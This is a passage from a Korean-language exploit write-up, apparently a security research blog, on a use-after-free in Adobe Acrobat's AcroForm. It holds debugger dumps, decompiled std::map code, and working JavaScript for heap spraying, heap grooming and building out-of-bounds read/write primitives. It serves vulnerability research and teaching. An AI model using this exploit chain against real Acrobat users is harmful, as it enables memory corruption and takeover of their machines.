class="hljs-attribute">2909d4a8</span>  b<span class="hljs-number">0</span>fe<span class="hljs-number">1536</span> <span class="hljs-number">8</span>c<span class="hljs-number">002000</span> <span class="hljs-number">42424141</span> <span class="hljs-number">44444343</span><span class="hljs-attribute">2909d4b8</span>  <span class="hljs-number">46464545</span> <span class="hljs-number">48484747</span> <span class="hljs-number">4</span>a<span class="hljs-number">4</span>a<span class="hljs-number">4949</span> <span class="hljs-number">4</span>c<span class="hljs-number">4</span>c<span class="hljs-number">4</span>b<span class="hljs-number">4</span>b<span class="hljs-attribute">2909d4c8</span>  <span class="hljs-number">4</span>e<span class="hljs-number">4</span>e<span class="hljs-number">4</span>d<span class="hljs-number">4</span>d <span class="hljs-number">50504</span>f<span class="hljs-number">4</span>f <span class="hljs-number">20000058</span> <span class="hljs-number">54545353</span><span class="hljs-attribute">2909d4d8</span>  <span class="hljs-number">56565555</span> <span class="hljs-number">58585757</span> <span class="hljs-number">5</span>a<span class="hljs-number">5</span>a<span class="hljs-number">5959</span> <span class="hljs-number">5</span>c<span class="hljs-number">5</span>c<span class="hljs-number">5</span>b<span class="hljs-number">5</span>b<span class="hljs-attribute">2909d4e8</span>  <span class="hljs-number">5</span>e<span class="hljs-number">5</span>e<span class="hljs-number">5</span>d<span class="hljs-number">5</span>d <span class="hljs-number">60605</span>f<span class="hljs-number">5</span>f <span class="hljs-number">00006161</span> <span class="hljs-number">00000000</span></code></pre><p> <code>std::map&lt;unsigned short,CAgg&gt;::operator[]</code>&#xD638;&#xCD9C;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>this-&gt;map</code>&#xC740; &#xD799; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xD1B5;&#xD574; 0x20000048&#xC5D0; &#xD560;&#xB2F9;&#xB41C; &#xC544;&#xB798;&#xC758; <code>ArrayBuffer</code>&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xACE0;  0x20000048&#xC5D0; 0x10 &#xBC14;&#xC774;&#xD2B8;&#xC758; &#xD5E4;&#xB354;&#xAC00; &#xC704;&#xCE58;&#xD574;&#xC788;&#xC73C;&#xBA70; 0x20000058&#xBD80;&#xD130; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC704;&#xCE58;&#xD558;&#xACE0; &#xC774;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xC5D0; &#xC758;&#xD574; &#xC0AC;&#xC804;&#xC5D0; &#xAD6C;&#xC131;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs basic"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dd <span class="hljs-number">0</span>x20000048<span class="hljs-symbol">20000048 </span> <span class="hljs-number">00000000</span> <span class="hljs-number">0000</span>ffe8 <span class="hljs-number">17</span>c7bbe0 <span class="hljs-number">00000000</span><span class="hljs-symbol">20000058 </span> <span class="hljs-number">20000060</span> <span class="hljs-number">41424345</span> <span class="hljs-number">41424344</span> <span class="hljs-number">20000044</span> // <span class="hljs-number">20000058</span> : this-&gt;map<span class="hljs-symbol">20000068 </span> <span class="hljs-number">33333333</span> <span class="hljs-number">33333333</span> <span class="hljs-number">33333333</span> <span class="hljs-number">33333333</span><span class="hljs-symbol">20000078 </span> <span class="hljs-number">33333333</span> <span class="hljs-number">33333333</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span></code></pre><p>&#xC704; &#xB370;&#xC774;&#xD130; &#xC911; <code>ArrayBuffer</code>&#xC758; &#xAE38;&#xC774;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xBD80;&#xBD84;&#xC740; &#xC624;&#xD504;&#xC14B; + 0x4&#xC778; 0x2000004c&#xB85C; <code>std::map&lt;unsigned short,CAgg&gt;::operator[]</code>&#xC5D0;&#xC11C; 0x20000058&#xC5D0; &#xAD6C;&#xC131;&#xB41C; fake <code>map</code>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>lower_bound</code>&#xC640; <code>insert</code>&#xC5D0; &#xC758;&#xD574; &#xBCC0;&#xC870;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="std-map-operator"><a href="#std-map-operator" class="headerlink" title="std::map::operator[]"></a>std::map<unsigned short,cagg>::operator[]</unsigned></h3><pre><code class="hljs c"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::<span class="hljs-keyword">operator</span>[](TREE_VAL *<span class="hljs-keyword">this</span>, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">unsigned</span> __int16 *pSomeID){...<span class="hljs-keyword">int</span> v8[<span class="hljs-number">3</span>]  ...  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::lower_bound(<span class="hljs-keyword">this</span>, v8, pSomeID);  v4 = v9;  <span class="hljs-keyword">if</span> ( sub_208E95F2(v9, pSomeID) )  {    ...  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">this</span>-&gt;_Mysize == <span class="hljs-number">0x38E38E3</span> )      Throw_tree_length_error();    ...    *(_DWORD *)a2 = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::insert(<span class="hljs-keyword">this</span>, v8[<span class="hljs-number">0</span>], (<span class="hljs-keyword">int</span>)v8[<span class="hljs-number">1</span>], Parent);    ...  }  <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xBA3C;&#xC800; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>lower_bound</code>&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;(<code>a2</code>)&#xB85C; &#xC804;&#xB2EC;&#xD55C; <code>v8</code>&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC501;&#xB2C8;&#xB2E4;.</p><h3 id="std-map-lower-bound"><a href="#std-map-lower-bound" class="headerlink" title="std::map::lower_bound"></a>std::map<unsigned short,cagg>::lower_bound</unsigned></h3><pre><code class="hljs c">_DWORD *__thiscall <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::lower_bound(<span class="hljs-keyword">int</span> <span class="hljs-keyword">this</span>, <span class="hljs-keyword">int</span> *a2, <span class="hljs-keyword">int</span> *a3){  <span class="hljs-keyword">int</span> Myhead; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">int</span> Parent; <span class="hljs-comment">// ecx</span>  <span class="hljs-keyword">unsigned</span> __int16 v5; <span class="hljs-comment">// si</span>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// eax</span>                                                <span class="hljs-comment">// TREE_VAL *this</span>  Myhead = *(_DWORD *)<span class="hljs-keyword">this</span>;                     <span class="hljs-comment">// this-&gt;_Myhead;</span>  <span class="hljs-comment">//    mov     eax,dword ptr [ecx]  ds:002b:20000058=20000060</span>  Parent = *(_DWORD *)(*(_DWORD *)<span class="hljs-keyword">this</span> + <span class="hljs-number">4</span>);    <span class="hljs-comment">// this-&gt;_Myhead-&gt;_Parent</span>  <span class="hljs-comment">//    mov     ecx,dword ptr [eax+4] ds:002b:20000064=20000044</span>  a2[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;  *a2 = Parent;  a2[<span class="hljs-number">2</span>] = Myhead;  ...  <span class="hljs-keyword">return</span> a2;                                    }</code></pre><p><code>Myhead</code>&#xC5D0;&#xB294; <code>this</code>(0x20000058)&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC5B4; 0x20000060&#xC774; &#xC800;&#xC7A5;&#xB418;&#xACE0; <code>Myhead-&gt;_Parent</code>(0x20000064)&#xC5D0; &#xC800;&#xC7A5;&#xB41C; 0x20000044&#xAC00; <code>Parent</code>&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. <code>lower_bound</code>&#xC758; &#xD638;&#xCD9C; &#xACB0;&#xACFC; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xD55C; <code>v8</code>&#xC758; 0, 1, 2 &#xC778;&#xB371;&#xC2A4;&#xC5D0; &#xAC01;&#xAC01; <code>Parent</code>(0x20000044), 0, <code>Myhead</code>(0x20000060) &#xAC12;&#xC774; &#xC4F0;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="std-map-insert"><a href="#std-map-insert" class="headerlink" title="std::map::insert"></a>std::map<unsigned short,cagg>::insert</unsigned></h3><pre><code class="hljs c"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::insert(<span class="hljs-keyword">int</span> *<span class="hljs-keyword">this</span>, <span class="hljs-keyword">int</span> *a2, <span class="hljs-keyword">int</span> *a3, <span class="hljs-keyword">int</span> *a4){  <span class="hljs-keyword">int</span> *Myhead; <span class="hljs-comment">// ebx</span>  <span class="hljs-keyword">int</span> *v5; <span class="hljs-comment">// esi</span>  <span class="hljs-keyword">int</span> *v6; <span class="hljs-comment">// edi</span>  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">int</span> *v9; <span class="hljs-comment">// edx</span>  <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// ecx</span>  ++<span class="hljs-keyword">this</span>[<span class="hljs-number">1</span>];                                    <span class="hljs-comment">// ++this-&gt;_Mysize;</span>  Myhead = (<span class="hljs-keyword">int</span> *)*<span class="hljs-keyword">this</span>;                        <span class="hljs-comment">// this-&gt;_Myhead</span>  v5 = a4;  a4[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">int</span>)a2;                              <span class="hljs-comment">// a4-&gt;_Parent = a2</span>  <span class="hljs-keyword">if</span> ( a2 != Myhead )  {    <span class="hljs-keyword">if</span> ( a3 )<span class="hljs-comment">// a3 == 0</span>    {      ...    }    <span class="hljs-keyword">else</span>    {    a2[<span class="hljs-number">2</span>] = (<span class="hljs-keyword">int</span>)a4;      <span class="hljs-keyword">if</span> ( a2 == (<span class="hljs-keyword">int</span> *)Myhead[<span class="hljs-number">2</span>] )        Myhead[<span class="hljs-number">2</span>] = (<span class="hljs-keyword">int</span>)a4;    }    ...  }  ...}</code></pre><p>&#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;(<code>a2</code>)&#xB294; <code>lower_bound</code>&#xC5D0;&#xC11C; <code>v8[0]</code>&#xC5D0; &#xC4F0;&#xC778; <code>Parent</code>(0x20000044)&#xC785;&#xB2C8;&#xB2E4;.&#xC138; &#xBC88;&#xC9F8; &#xC778;&#xC790;(<code>a3</code>)&#xC740;  <code>lower_bound</code>&#xC5D0;&#xC11C; &#xC4F0;&#xC778; 0&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>else</code>&#xB85C; &#xBD84;&#xAE30;&#xD569;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; <code>a2[2] = (int)a4;</code>&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; <code>Parent + 8</code>(0x2000004c)&#xC5D0; &#xC5B4;&#xB5A4; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xC4F0;&#xC774;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs routeros"><span class="hljs-attribute">eax</span>=20000044 <span class="hljs-attribute">ebx</span>=20000060 <span class="hljs-attribute">ecx</span>=20000058 <span class="hljs-attribute">edx</span>=291a1bf8 <span class="hljs-attribute">esi</span>=291a1bf8 <span class="hljs-attribute">edi</span>=20000058<span class="hljs-attribute">eip</span>=6385bccf <span class="hljs-attribute">esp</span>=0457ab88 <span class="hljs-attribute">ebp</span>=0457ab94 <span class="hljs-attribute">iopl</span>=0         nv up ei pl zr na pe nc<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200246AcroForm!hb_set_invert+0x3d1f:6385bccf 897008          mov     dword ptr [eax+8],esi ds:002b:<span class="hljs-attribute">2000004c</span>=0000ffe8</code></pre><p><code>Parent + 8</code>&#xC740; <code>ArrayBuffer</code>&#xC758; length&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC6D0;&#xB798;&#xC758; &#xD06C;&#xAE30;&#xC778; 0xffe8&#xBCF4;&#xB2E4; &#xD6E8;&#xC52C; &#xD07D;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD574;&#xB2F9; <code>ArrayBuffer</code>&#xB97C; &#xD1B5;&#xD574; OOB Read/Write&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Javascript-code"><a href="#Javascript-code" class="headerlink" title="Javascript code"></a>Javascript code</h3><p>&#xC544;&#xB798;&#xB294; &#xC704; &#xACFC;&#xC815;&#xC744; &#xC218;&#xD589;&#xD558;&#xC5EC; OOB Read/Write&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xB294; <code>ArrayBuffer</code>&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; Javascript &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-comment">/*</span><span class="hljs-comment">....</span><span class="hljs-comment">*/</span><span class="hljs-keyword">const</span> ALLOC_SIZE = <span class="hljs-number">0x10000</span> - <span class="hljs-number">24</span>;<span class="hljs-keyword">const</span> ARR_BUF_BASE = <span class="hljs-number">0x20000048</span>;<span class="hljs-keyword">const</span> ARR_BUF_MALLOC_BASE = <span class="hljs-number">0x20000040</span>;<span class="hljs-keyword">const</span> arrBufPtr = ARR_BUF_BASE + <span class="hljs-number">0x10</span>;<span class="hljs-keyword">const</span> FAKE_STR_START = <span class="hljs-number">0x40</span>;<span class="hljs-keyword">const</span> FAKE_STR = arrBufPtr + <span class="hljs-number">0x100</span>;<span class="hljs-keyword">const</span> FAKE_DV_START = <span class="hljs-number">0x60</span>;<span class="hljs-keyword">const</span> FAKE_DV = arrBufPtr + <span class="hljs-number">0x180</span>;<span class="hljs-comment">/*</span><span class="hljs-comment">....</span><span class="hljs-comment">*/</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">groomLFH</span>(<span class="hljs-params">size, count</span>) </span>{    <span class="hljs-keyword">var</span> code =        <span class="hljs-string">&quot;%u4141%u4242%u4343%u4444%u4545%u4646%u4747%u4848%u4949%u4a4a%u4b4b%u4c4c%u4d4d%u4e4e%u4f4f%u5050%u0058%u2000%u5353%u5454%u5555%u5656%u5757%u5858%u5959%u5a5a%u5b5b%u5c5c%u5d5d%u5e5e%u5f5f%u6060%u6161%u6262%u6363%u6464%u6565%u6666%u6767%u6868%u6969%u6a6a%u6b6b%u6c6c%u6d6d%u6e6e%u6f6f%u7070%u7171%u7272%u7373%u7474%u7575%u7676%u7777%u7878%u7979%u7a7a%u7b7b%u7c7c%u7d7d%u7e7e%u7f7f%u8080%u8181%u8282%u8383%u8484&quot;</span>;    <span class="hljs-keyword">var</span> string = <span class="hljs-built_in">unescape</span>(code);    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) {        chunks.push(string.substr(<span class="hljs-number">0</span>, (size - <span class="hljs-number">2</span>) / <span class="hljs-number">2</span>).toUpperCase());    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; chunks.length; i += <span class="hljs-number">2</span>) {        chunks[i] = <span class="hljs-literal">null</span>;        <span class="hljs-keyword">delete</span> chunks[i];    }}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sprayArrBuffers</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1500</span>; i++) {        bufs[i] = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(ALLOC_SIZE);        <span class="hljs-keyword">const</span> uintArr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(bufs[i]);        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">16</span>; k++) {            uintArr[k] = <span class="hljs-number">0x33333333</span>;        }        uintArr[<span class="hljs-number">0</span>] = arrBufPtr + <span class="hljs-number">8</span>; <span class="hljs-comment">//first deref a = *ecx</span>        uintArr[<span class="hljs-number">1</span>] = <span class="hljs-number">0x41424344</span>; <span class="hljs-comment">//map size</span>        uintArr[<span class="hljs-number">2</span>] = <span class="hljs-number">0x41424344</span>;        uintArr[<span class="hljs-number">3</span>] = ARR_BUF_BASE - <span class="hljs-number">4</span>;        <span class="hljs-comment">// fake string for arbitrary read</span>        uintArr[FAKE_STR_START] = <span class="hljs-number">0x102</span>; <span class="hljs-comment">//type</span>        uintArr[FAKE_STR_START + <span class="hljs-number">1</span>] = arrBufPtr + <span class="hljs-number">0x40</span>; <span class="hljs-comment">// buffer</span>        uintArr[FAKE_STR_START + <span class="hljs-number">2</span>] = <span class="hljs-number">0x4</span>;        uintArr[FAKE_STR_START + <span class="hljs-number">3</span>] = <span class="hljs-number">0x4</span>;        <span class="hljs-comment">// fake dataview for arbitrary write</span>        uintArr[FAKE_DV_START] = <span class="hljs-number">0x77777777</span>;        <span class="hljs-keyword">delete</span> uintArr;        uintArr = <span class="hljs-literal">null</span>;    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) {        arrs[i] = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>);        arrs[i][<span class="hljs-number">0</span>] = <span class="hljs-number">0x47484950</span>;        arrs[i][<span class="hljs-number">1</span>] = targetStr;        arrs[i][<span class="hljs-number">2</span>] = targetDV;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k = <span class="hljs-number">3</span>; k &lt; <span class="hljs-number">5000</span>; k++) {            arrs[i][k] = <span class="hljs-number">0x50515051</span>;        }    }}<span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[*] spraying array buffer...&quot;</span>);sprayArrBuffers();<span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[*] pre-populating LFH...&quot;</span>);groomLFH(<span class="hljs-number">68</span>, <span class="hljs-number">5000</span>);<span class="hljs-comment">/*</span><span class="hljs-comment">Trigger the Bug</span><span class="hljs-comment">*/</span></code></pre><p><code>sprayArrBuffers</code>&#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; 0xffe8 &#xD06C;&#xAE30;&#xB97C; &#xAC00;&#xC9C0;&#xB294; <code>ArrayBuffer</code>&#xB97C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; 0x20000048&#xC5D0; <code>ArrayBuffer</code>&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; <code>ArrayBuffer</code>&#xC5D0;&#xC11C; OOB Read/Write&#xB85C; &#xC811;&#xADFC;&#xD560; <code>Array</code>&#xB97C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xD558;&#xC5EC; &#xC778;&#xC811;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xC774;&#xB294; &#xCD94;&#xD6C4;&#xC5D0; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC2A4;&#xD504;&#xB808;&#xC774;&#xB418;&#xB294; <code>ArrayBuffer</code>&#xC5D0;&#xB294; <code>std::map&lt;unsigned short,CAgg&gt;::lower_bound</code>&#xC640;  <code>std::map&lt;unsigned short,CAgg&gt;::insert</code>&#xC758; &#xB3D9;&#xC791;&#xC5D0; &#xC758;&#xD574; length&#xAC00; &#xB36E;&#xC5B4; &#xC4F0;&#xC774;&#xB3C4;&#xB85D; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>groomLFH</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>String</code> &#xB370;&#xC774;&#xD130; &#xD560;&#xB2F9;&#xC744; &#xD1B5;&#xD574; &#xD799; &#xADF8;&#xB8E8;&#xBC0D;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xBB38;&#xC790;&#xC5F4; &#xB370;&#xC774;&#xD130;&#xC5D0;&#xB294; <code>%u0058%u2000</code>&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xACE0; <code>unescape</code>&#xB85C; &#xC778;&#xD574; fake <code>map</code>&#xC758; &#xC8FC;&#xC18C;&#xC778; 0x20000058&#xB85C; &#xBCC0;&#xACBD;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xBC84;&#xADF8;&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB41C; &#xC774;&#xD6C4; <code>groomLFH</code>&#xC5D0;&#xC11C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xBCC0;&#xD658;&#xB41C; <code>CAgg</code>&#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB4E4;&#xC740; &#xB2E4;&#xC2DC; &#xBCC0;&#xD658;&#xC744; &#xAC70;&#xCE58;&#xAC8C; &#xB418;&#xB294;&#xB370; &#xC774;&#xB54C; &#xBB38;&#xC790;&#xC5F4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC62E;&#xAE38; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. brute-force&#xB85C; &#xC54C;&#xC544;&#xB0B8; &#xD06C;&#xAE30;&#xC778; 68&#xB85C; &#xD799; &#xADF8;&#xB8E8;&#xBC0D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xBA74; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Use-After-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC7AC;&#xD560;&#xB2F9;&#xD558;&#xC5EC; fake <code>map</code>&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC704;&#xCE58;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="2-Out-of-Bounds-Read-Write-via-Corrupted-ArrayBuffer"><a href="#2-Out-of-Bounds-Read-Write-via-Corrupted-ArrayBuffer" class="headerlink" title="2. Out-of-Bounds Read/Write via Corrupted ArrayBuffer"></a>2. Out-of-Bounds Read/Write via Corrupted ArrayBuffer</h2><p>length&#xAC00; &#xBCC0;&#xC870;&#xB41C; <code>ArrayBuffer</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; OOB Read/Write&#xB85C; &#xB2E4;&#xB978; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xBCC0;&#xC870;&#xD558;&#xC5EC; &#xCD94;&#xD6C4;&#xC5D0; Arbitrary Address Read/Write&#xC5D0; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xBCC0;&#xC870;&#xB41C; &#xAE38;&#xC774;&#xB97C; &#xAC00;&#xC9C0;&#xB294; <code>ArrayBuffer</code>&#xB97C; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-keyword">var</span> arrStart = <span class="hljs-number">0</span>;<span class="hljs-keyword">var</span> corruptedTypedArr = <span class="hljs-literal">null</span>;<span class="hljs-keyword">var</span> originalTargetStrAddr = <span class="hljs-number">0</span>,    originalTargetDVAddr = <span class="hljs-number">0</span>;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; bufs.length; i++) {    <span class="hljs-keyword">if</span> (bufs[i].byteLength != ALLOC_SIZE) {        <span class="hljs-built_in">console</span>.println(            <span class="hljs-string">&quot;[+] corrupted array buffer found at &quot;</span> +                i +                <span class="hljs-string">&quot; : length: &quot;</span> +                bufs[i].byteLength +                <span class="hljs-string">&quot; : buf length: &quot;</span> +                bufs.length        );        <span class="hljs-keyword">const</span> uintArr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(bufs[i]);        <span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[*] checking leaked global array...&quot;</span>);        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> x = ((bufs.length - i) * <span class="hljs-number">0xfff8</span>) / <span class="hljs-number">4</span>; x &lt; uintArr.length; x++) {            <span class="hljs-keyword">if</span> (uintArr[x] == <span class="hljs-number">0x47484950</span>) {                arrStart = x - <span class="hljs-number">4</span>;                <span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[*] leaked global array found at index:&quot;</span> + arrStart);                <span class="hljs-keyword">break</span>;            }        }        <span class="hljs-comment">// store for recovery</span>        originalTargetStrAddr = uintArr[arrStart + <span class="hljs-number">6</span>];        originalTargetDVAddr = uintArr[arrStart + <span class="hljs-number">8</span>];        <span class="hljs-comment">// corrupt for further primitives</span>        uintArr[arrStart + <span class="hljs-number">4</span>] = <span class="hljs-number">0x47484951</span>;        uintArr[arrStart + <span class="hljs-number">6</span>] = FAKE_STR;        uintArr[arrStart + <span class="hljs-number">8</span>] = FAKE_DV;        corruptedTypedArr = uintArr;        <span class="hljs-keyword">break</span>;    }}</code></pre><p>&#xC2A4;&#xD504;&#xB808;&#xC774;&#xB41C; <code>ArrayBuffer</code>&#xB4E4;&#xC758; length&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xC5EC; &#xD560;&#xB2F9;&#xC5D0; &#xC0AC;&#xC6A9;&#xD55C; &#xD06C;&#xAE30;&#xC778; <code>ALLOC_SIZE</code>(0xffe8)&#xC640; &#xAC19;&#xC740;&#xC9C0; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; OOB Read/Write&#xAC00; 